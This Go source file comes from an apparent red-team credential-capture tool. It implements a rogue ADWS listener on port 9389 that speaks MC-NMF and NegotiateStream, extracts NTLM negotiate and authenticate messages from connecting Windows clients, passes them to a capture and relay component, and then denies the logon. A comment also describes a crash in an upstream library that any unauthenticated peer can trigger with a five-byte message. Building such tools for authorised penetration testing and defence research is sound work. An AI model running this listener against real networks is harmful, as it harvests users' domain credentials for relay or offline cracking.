package flamingo

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/mandiant/gopacket/pkg/relay"
	log "github.com/sirupsen/logrus"
)

// ConfADWS holds the configuration for an ADWS capture server.
//
// Active Directory Web Services listens on 9389. Its NetTcpBinding endpoints
// speak the .NET Message Framing Protocol (MC-NMF) with a NegotiateStream
// (MS-NNS) handshake carrying NTLM inside it, which is what this listener
// implements: the framing preamble, the upgrade to Negotiate, and the
// handshake records that carry the NTLMSSP messages. Everything past the
// handshake is refused, so an ADWS client gets no further than the logon it
// has already given up.
//
// gopacket's relay.NewWCFRelayServer covers the same protocol, and the rest of
// this phase is built on upstream's listeners, but this one is not: upstream
// indexes the first byte of a handshake blob without checking its length
// (wcf_server.go:232 and again at the Type3 blob), so a five-byte message from
// any unauthenticated peer panics the handler goroutine and takes the whole
// process down with it. The protocol is small enough to own, so flamingo owns
// it. Swapping back is a one-line change in SpawnADWS if upstream fixes it.
type ConfADWS struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter
	capture      *NTLMCapture
	shutdown     bool
	m            sync.Mutex
}

// NewConfADWS creates a default configuration for the ADWS capture server.
func NewConfADWS() *ConfADWS {
	return &ConfADWS{
		BindPort: 9389,
		BindHost: "[::]",
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfADWS) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfADWS) Shutdown() {
	c.m.Lock()
	capture := c.capture
	if c.shutdown {
		c.m.Unlock()
		return
	}
	c.shutdown = true
	c.m.Unlock()

	if capture != nil {
		capture.Stop()
	}
}

// SpawnADWS starts a logging ADWS server, normally on port 9389.
func SpawnADWS(c *ConfADWS) error {
	addr := fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)
	capture := NewNTLMCapture("adws", addr, c.RecordWriter)

	c.m.Lock()
	if c.shutdown {
		c.m.Unlock()
		return errors.New("adws is shut down")
	}
	c.capture = capture
	c.m.Unlock()

	if err := capture.Start(newADWSServer(addr)); err != nil {
		return err
	}
	log.Debugf("adws is listening on %s", addr)
	return nil
}

// MC-NMF record types (MS-NMF 2.2.3). The preamble a NetTcpBinding client
// sends is a version, a mode, a via URL, an encoding and an upgrade request;
// the server answers the upgrade request and the stream becomes a
// NegotiateStream.
const (
	nmfVersionRecord       = 0x00
	nmfModeRecord          = 0x01
	nmfViaRecord           = 0x02
	nmfKnownEncodingRecord = 0x03
	nmfUpgradeRequest      = 0x09
	nmfUpgradeResponse     = 0x0a
	nmfFault               = 0x0b
)

// MS-NNS handshake message identifiers (MS-NNS 2.2.2).
const (
	nnsHandshakeDone       = 0x14
	nnsHandshakeError      = 0x15
	nnsHandshakeInProgress = 0x16
)

// nnsLogonDenied is SEC_E_LOGON_DENIED, the HRESULT the handshake error
// carries once the credential has been captured and the logon refused.
const nnsLogonDenied = 0x8009030C

// Per-connection limits. The handshake is a handful of small records, so cap
// the strings, the record count and the time a client may hold a goroutine.
const (
	adwsTimeout    = 30 * time.Second
	adwsMaxString  = 4096
	adwsMaxRecords = 8
)

// adwsUpgrade is the only stream upgrade this listener accepts, and the one an
// ADWS client asks for.
const adwsUpgrade = "application/negotiate"

// adwsServer is flamingo's MC-NMF/NegotiateStream listener. It implements
// relay.ProtocolServer, so it plugs into NTLMCapture exactly like upstream's
// servers do and the relay phase can drive it unchanged.
type adwsServer struct {
	listenAddr string
	listener   net.Listener
	results    chan<- relay.AuthResult
	done       chan struct{}
	closeOnce  sync.Once
}

func newADWSServer(listenAddr string) *adwsServer {
	return &adwsServer{listenAddr: listenAddr, done: make(chan struct{})}
}

// Start begins listening, implementing relay.ProtocolServer.
func (s *adwsServer) Start(results chan<- relay.AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return err
	}
	s.listener = ln
	s.results = results
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go s.handleConnection(conn)
		}
	}()
	return nil
}

// Stop closes the listener, implementing relay.ProtocolServer. Connections
// already accepted run out their own deadlines.
func (s *adwsServer) Stop() error {
	s.closeOnce.Do(func() { close(s.done) })
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// handleConnection runs the framing preamble and the NTLM handshake for one
// client, handing the messages to the capture adapter.
func (s *adwsServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	// One deadline for the whole exchange, so a client cannot keep a
	// goroutine alive by trickling bytes.
	conn.SetDeadline(time.Now().Add(adwsTimeout))
	r := newADWSReader(conn)

	if err := adwsPreamble(r, conn); err != nil {
		log.Debugf("adws preamble from %s: %s", conn.RemoteAddr(), err)
		return
	}

	type1, wrapped, err := adwsReadNegotiate(r, conn)
	if err != nil {
		log.Debugf("adws handshake from %s: %s", conn.RemoteAddr(), err)
		return
	}

	auth := relay.AuthResult{
		NTLMType1:  type1,
		SourceAddr: conn.RemoteAddr().String(),
		ServerConn: conn,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}
	select {
	case s.results <- auth:
	case <-s.done:
		return
	}

	// Once the adapter has the exchange it is waiting on Type3Ch. Closing
	// that channel on every path that never gets there releases it at once
	// instead of leaving it to time out.
	delivered := false
	defer func() {
		if !delivered {
			close(auth.Type3Ch)
		}
	}()

	challenge, ok := <-auth.Type2Ch
	if !ok || challenge == nil {
		return
	}
	payload := challenge
	if wrapped {
		payload = smbSPNEGONegTokenResp(challenge)
	}
	if err := adwsWriteHandshake(conn, nnsHandshakeInProgress, payload); err != nil {
		return
	}

	_, blob, err := adwsReadHandshake(r)
	if err != nil {
		log.Debugf("adws authenticate from %s: %s", conn.RemoteAddr(), err)
		return
	}
	type3 := FindNTLMSSP(blob)
	if NTLMMessageType(type3) != NTLMTypeAuthenticate {
		log.Debugf("adws handshake record from %s carries no AUTHENTICATE", conn.RemoteAddr())
		return
	}

	auth.Type3Ch <- type3
	delivered = true

	var success bool
	select {
	case success = <-auth.ResultCh:
	case <-s.done:
	}
	if success {
		adwsWriteHandshake(conn, nnsHandshakeDone, nil)
		return
	}
	// Capture only: the credential is recorded, so the logon is refused.
	adwsWriteHandshake(conn, nnsHandshakeError, binary.BigEndian.AppendUint32(
		[]byte{0x00, 0x00, 0x00, 0x00}, nnsLogonDenied))
}

// adwsReader reads the framing stream a byte or a block at a time, refusing
// anything larger than the per-connection limit.
type adwsReader struct {
	r io.Reader
}

func newADWSReader(conn net.Conn) *adwsReader {
	return &adwsReader{r: conn}
}

func (a *adwsReader) byteValue() (byte, error) {
	var b [1]byte
	if _, err := io.ReadFull(a.r, b[:]); err != nil {
		return 0, err
	}
	return b[0], nil
}

func (a *adwsReader) block(n int) ([]byte, error) {
	if n < 0 || n > adwsMaxString {
		return nil, fmt.Errorf("oversized block of %d bytes", n)
	}
	if n == 0 {
		return nil, nil
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(a.r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// size reads an MC-NMF record size: a .NET 7-bit encoded variable-length
// integer, little-endian, at most five bytes.
func (a *adwsReader) size() (int, error) {
	var n, shift int
	for i := 0; i < 5; i++ {
		b, err := a.byteValue()
		if err != nil {
			return 0, err
		}
		n |= int(b&0x7f) << shift
		if b&0x80 == 0 {
			if n < 0 || n > adwsMaxString {
				return 0, fmt.Errorf("oversized record of %d bytes", n)
			}
			return n, nil
		}
		shift += 7
	}
	return 0, errors.New("record size is longer than five bytes")
}

// string reads a length-prefixed UTF-8 string.
func (a *adwsReader) string() (string, error) {
	n, err := a.size()
	if err != nil {
		return "", err
	}
	b, err := a.block(n)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// adwsPreamble consumes the MC-NMF preamble and answers the upgrade request,
// which is what turns the connection into a NegotiateStream.
func adwsPreamble(r *adwsReader, conn net.Conn) error {
	expect := func(want byte, name string) error {
		got, err := r.byteValue()
		if err != nil {
			return err
		}
		if got != want {
			return fmt.Errorf("expected a %s record, got 0x%02x", name, got)
		}
		return nil
	}

	// VersionRecord: major and minor.
	if err := expect(nmfVersionRecord, "version"); err != nil {
		return err
	}
	if _, err := r.block(2); err != nil {
		return err
	}

	// ModeRecord: the framing mode, which a capture never acts on.
	if err := expect(nmfModeRecord, "mode"); err != nil {
		return err
	}
	if _, err := r.byteValue(); err != nil {
		return err
	}

	// ViaRecord: the endpoint URL the client is addressing.
	if err := expect(nmfViaRecord, "via"); err != nil {
		return err
	}
	via, err := r.string()
	if err != nil {
		return err
	}
	log.Debugf("adws via %q from %s", via, conn.RemoteAddr())

	// KnownEncodingRecord: the message encoding, likewise unused.
	if err := expect(nmfKnownEncodingRecord, "encoding"); err != nil {
		return err
	}
	if _, err := r.byteValue(); err != nil {
		return err
	}

	// UpgradeRequestRecord: only the Negotiate upgrade is answered. Anything
	// else gets a fault rather than silence, so a client fails fast.
	if err := expect(nmfUpgradeRequest, "upgrade request"); err != nil {
		return err
	}
	upgrade, err := r.string()
	if err != nil {
		return err
	}
	if upgrade != adwsUpgrade {
		conn.Write([]byte{nmfFault})
		return fmt.Errorf("unsupported stream upgrade %q", upgrade)
	}
	_, err = conn.Write([]byte{nmfUpgradeResponse})
	return err
}

// adwsReadNegotiate reads handshake records until one carries an NTLMSSP
// NEGOTIATE, and reports whether it arrived wrapped in a SPNEGO token so the
// CHALLENGE can be sent back the same way.
func adwsReadNegotiate(r *adwsReader, conn net.Conn) (type1 []byte, wrapped bool, err error) {
	for i := 0; i < adwsMaxRecords; i++ {
		id, blob, err := adwsReadHandshake(r)
		if err != nil {
			return nil, false, err
		}
		if id != nnsHandshakeInProgress {
			return nil, false, fmt.Errorf("handshake message 0x%02x before authentication", id)
		}
		msg := FindNTLMSSP(blob)
		if NTLMMessageType(msg) == NTLMTypeNegotiate {
			// A raw NTLMSSP token starts with the signature; anything else
			// carried it inside SPNEGO.
			return msg, len(blob) != len(msg), nil
		}
		// A token that is not NTLM at all, typically a Kerberos-first
		// SPNEGO offer: ask again rather than dropping the client.
		if err := adwsWriteHandshake(conn, nnsHandshakeInProgress, smbSPNEGONegTokenResp(nil)); err != nil {
			return nil, false, err
		}
	}
	return nil, false, errors.New("no NTLMSSP NEGOTIATE in the handshake")
}

// adwsReadHandshake reads one NegotiateStream handshake record: a message
// identifier, a two-byte version and a big-endian payload length.
func adwsReadHandshake(r *adwsReader) (byte, []byte, error) {
	var hdr [5]byte
	if _, err := io.ReadFull(r.r, hdr[:]); err != nil {
		return 0, nil, err
	}
	switch hdr[0] {
	case nnsHandshakeDone, nnsHandshakeError, nnsHandshakeInProgress:
	default:
		return hdr[0], nil, fmt.Errorf("unknown handshake message 0x%02x", hdr[0])
	}
	n := int(binary.BigEndian.Uint16(hdr[3:5]))
	if n == 0 {
		// A zero-length payload is legal framing and carries no token. It
		// is also what crashes upstream's implementation of this protocol,
		// so it is answered here rather than indexed into.
		return hdr[0], nil, nil
	}
	blob := make([]byte, n)
	if _, err := io.ReadFull(r.r, blob); err != nil {
		return hdr[0], nil, err
	}
	return hdr[0], blob, nil
}

// adwsWriteHandshake writes one NegotiateStream handshake record.
func adwsWriteHandshake(conn net.Conn, id byte, payload []byte) error {
	if len(payload) > 0xffff {
		return fmt.Errorf("oversized handshake payload of %d bytes", len(payload))
	}
	rec := []byte{id, 0x01, 0x00, 0x00, 0x00}
	binary.BigEndian.PutUint16(rec[3:5], uint16(len(payload)))
	_, err := conn.Write(append(rec, payload...))
	return err
}
